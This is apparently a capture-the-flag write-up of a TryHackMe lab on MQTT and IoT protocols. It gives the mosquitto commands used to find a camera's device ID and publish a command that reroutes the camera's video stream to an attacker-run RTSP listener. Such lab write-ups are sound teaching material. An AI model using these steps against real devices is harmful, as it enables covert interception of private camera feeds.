---
layout: single
title: "[Day 21] MQTT Have yourself a merry little webcam"
header:
  teaser: "/assets/images/hacking-teaser.JPG"
---

# IoT protocols
|Protocol |	Communication Method |	Description |
|---------|----------------------|--------------|
|MQTT (Message Queuing Telemetry Transport)|	Middleware | A lightweight protocol that relies on a publish/subscribe model to send or receive messages.|
|CoAP (Constrained Application Protocol)|	Middleware|	Translates HTTP communication to a usable communication medium for lightweight devices.|
|AMQP (Advanced Message Queuing Protocol)|	Middleware|	Acts as a transactional protocol to receive, queue, and store messages/payloads between devices.|
|DDS (Data Distribution Service|	Middleware |	A scalable protocol that relies on a publish/subscribe model to send or receive messages. |
|HTTP (Hypertext Transfer Protocol)|	Device-to-Device|	Used as a communication method from traditional devices to lightweight devices or for large data communication.|
|WebSocket |	Device-to-Device |	Relies on a client-server model to send data over a TCP connection.|


# MQTT
The mqtt is a messages protocol using publish subscribe model.
![Check entropy of binary](/assets/images/tryhackme/day21/publish-subscribe-model.png)

to overcome the problem of different types of data and multiple publisher the publish/subscribe model uses topics: 

![Check entropy of binary](/assets/images/tryhackme/day21/publish-subscribe-mode-topic-publish.png)
![Check entropy of binary](/assets/images/tryhackme/day21/publish-subscribe-mode-topic-subscribe.png)

An MQTT broker assigns all devices connected to it read/write access to all topics; that is, any device can publish and subscribe to a topic.
MQTT, a device ID is commonly exchanged by publishing a message containing the device ID to a pre-known topic that anyone can subscribe to.

## Tools
* Paho Paho is a python library that offers support for all features of MQTT.
* Mosquitto is a suite of MQTT utilities that include a broker and publish/subscribe clients that we can use from the command line.

Command to subscribe to topic "device/thm" on broker behind example.thm: ```mosquitto_sub -h example.thm -t device/thm```

### Nmap script scanning
Nmap script scan of all ports
```nmap -sC -sV -p- <Target IP> -vv --min-rate 1500```

# Task

We want to send a message to "device/{deviceID}/cmd topic which configure the camera to stream its content to our own rtsp listener. 
To get the deviceID we can listen to the "device/init" topic. 

We first run Nmap script scan to find out there is mosquitto running on the target with the topic: device/init 
We then subscribe to it: ```mosquitto_sub -h 10.10.220.164 -t device/init```

We start a rtsp listener server via: 
```docker run --rm -it --network=host aler9/rtsp-simple-server```

We send this message to the MQTT
```mosquitto_pub -h 10.10.220.164 -t device/R1MM6C0Z4TXJLT96H5T2/cmd -m "{"cmd":10,"url":"rtsp://10.10.4.182:8554/something"}"```

Via ```vlc rtsp://127.0.0.1:8554/something``` we see that we actually rerouted the video feed to our listener.

